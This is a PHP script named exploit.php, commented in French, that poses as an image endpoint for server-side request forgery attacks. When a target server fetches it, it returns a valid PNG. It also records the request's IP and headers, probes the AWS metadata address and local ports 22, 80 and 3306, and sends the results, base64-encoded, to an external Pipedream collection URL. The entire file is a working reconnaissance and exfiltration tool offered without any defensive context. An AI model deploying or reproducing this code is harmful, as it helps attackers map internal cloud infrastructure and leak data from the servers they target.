<?php
// exploit.php - Sert une image mais fait aussi des actions côté serveur

// 1. CAPTURER LES INFORMATIONS DU SERVEUR TARGET
$serverInfo = [
    'timestamp' => date('Y-m-d H:i:s'),
    'remote_ip' => $_SERVER['REMOTE_ADDR'],  // IP DU SERVEUR TARGET !
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
    'referer' => $_SERVER['HTTP_REFERER'] ?? '',
    'method' => $_SERVER['REQUEST_METHOD'],
    'headers' => getallheaders(),
    'query_string' => $_SERVER['QUERY_STRING'] ?? '',
    
    // Tenter d'accéder à des ressources internes depuis CE serveur
    'metadata_aws' => testInternalResource('http://169.254.169.254/latest/meta-data/'),
    'localhost_80' => testPort('127.0.0.1', 80),
    'localhost_22' => testPort('127.0.0.1', 22),
    'localhost_3306' => testPort('127.0.0.1', 3306),
];

// 2. EXFILTRER VERS PIPEDREAM
exfiltrateToPipedream($serverInfo);

// 3. SERVIR UNE IMAGE PNG VALIDE (obligatoire)
header('Content-Type: image/png');

// Créer une image qui encode les informations
$im = createImageWithData($serverInfo);
imagepng($im);
imagedestroy($im);

// ================= FONCTIONS =================

function testInternalResource($url) {
    $context = stream_context_create([
        'http' => ['timeout' => 2]
    ]);
    
    try {
        $response = @file_get_contents($url, false, $context, 0, 100);
        return $response !== false ? 'ACCESSIBLE' : 'INACCESSIBLE';
    } catch (Exception $e) {
        return 'ERROR';
    }
}

function testPort($host, $port, $timeout = 2) {
    $fp = @fsockopen($host, $port, $errno, $errstr, $timeout);
    if ($fp) {
        fclose($fp);
        return 'OPEN';
    }
    return 'CLOSED';
}

function exfiltrateToPipedream($data) {
    $pipedreamUrl = 'https://eo1yzt16ee3bzu9.m.pipedream.net';
    
    // Encoder les données
    $encodedData = base64_encode(json_encode($data));
    
    // Envoyer via plusieurs méthodes
    $urls = [
        $pipedreamUrl . '?data=' . urlencode($encodedData) . '&type=ssrf',
        $pipedreamUrl . '?ip=' . urlencode($data['remote_ip']) . '&ua=' . urlencode($data['user_agent']),
    ];
    
    foreach ($urls as $url) {
        @file_get_contents($url, false, stream_context_create([
            'http' => ['timeout' => 1]
        ]));
    }
    
    // Sauvegarder localement aussi
    file_put_contents('ssrf_log.txt', json_encode($data) . "\n", FILE_APPEND);
}

function createImageWithData($data) {
    // Créer une image 200x200
    $im = imagecreate(200, 200);
    
    // Couleur basée sur l'IP (pour identification visuelle)
    $ip = $data['remote_ip'];
    $hash = crc32($ip);
    $r = ($hash & 0xFF0000) >> 16;
    $g = ($hash & 0x00FF00) >> 8;
    $b = $hash & 0x0000FF;
    
    $bgColor = imagecolorallocate($im, $r, $g, $b);
    imagefilledrectangle($im, 0, 0, 199, 199, $bgColor);
    
    // Ajouter du texte avec les infos principales
    $textColor = imagecolorallocate($im, 255, 255, 255);
    
    // Premier octet de l'IP
    $ipParts = explode('.', $ip);
    $shortIp = $ipParts[0] . '.' . $ipParts[1] . '.x.x';
    
    imagestring($im, 3, 10, 10, "IP: " . $shortIp, $textColor);
    imagestring($im, 3, 10, 30, "UA: " . substr($data['user_agent'], 0, 20), $textColor);
    imagestring($im, 3, 10, 50, "TIME: " . date('H:i:s'), $textColor);
    
    // Ajouter un pixel spécial avec code d'état
    $statusColor = imagecolorallocate($im, 
        $data['metadata_aws'] === 'ACCESSIBLE' ? 0 : 255,
        $data['localhost_80'] === 'OPEN' ? 255 : 0,
        $data['localhost_3306'] === 'OPEN' ? 255 : 0
    );
    imagesetpixel($im, 195, 195, $statusColor);
    
    return $im;
}
?>
